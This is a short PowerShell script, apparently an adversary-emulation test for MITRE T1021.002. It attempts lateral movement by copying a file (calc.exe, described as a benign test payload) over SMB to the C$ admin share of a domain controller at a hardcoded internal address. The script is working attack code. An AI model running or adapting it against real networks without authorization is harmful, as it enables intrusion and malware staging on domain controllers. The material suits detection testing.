$ErrorActionPreference = "Continue"
$DC_IP = "10.160.37.16"
$PayloadSource = "C:\Windows\System32\calc.exe" # Using benign binary for test
$PayloadDest = "\\$DC_IP\C$\Windows\Temp\lateral_test.exe"

Write-Host "[*] Initiating Lateral Movement to Domain Controller..."
Write-Host "[*] Target: $DC_IP"

Write-Host "[*] Verifying Network Path..."
if (Test-Connection -ComputerName $DC_IP -Count 1 -Quiet) {
    Write-Host "    [+] Target is Reachable."
} else {
    Write-Host "    [-] Target unreachable. Ensure VPN/Network is configured."
    # Continuing anyway to try SMB
}

Write-Host "`n[*] [T1021.002] Attempting SMB File Copy..."
Write-Host "    [>] Copy-Item -Path $PayloadSource -Destination $PayloadDest"

try {
    # REAL EXECUTION
    Copy-Item -Path $PayloadSource -Destination $PayloadDest -ErrorAction Stop
    Write-Host "    [+] Payload Transferred Successfully."
    Write-Host "    [+] File created at: $PayloadDest"
} catch {
    Write-Host "    [-] SMB Transfer Failed: $_"
    Write-Host "    [i] Common causes: Auth failure, Firewall, Admin$ disabled."
}

Write-Host "`n[+] Lateral Movement Attempt Complete."
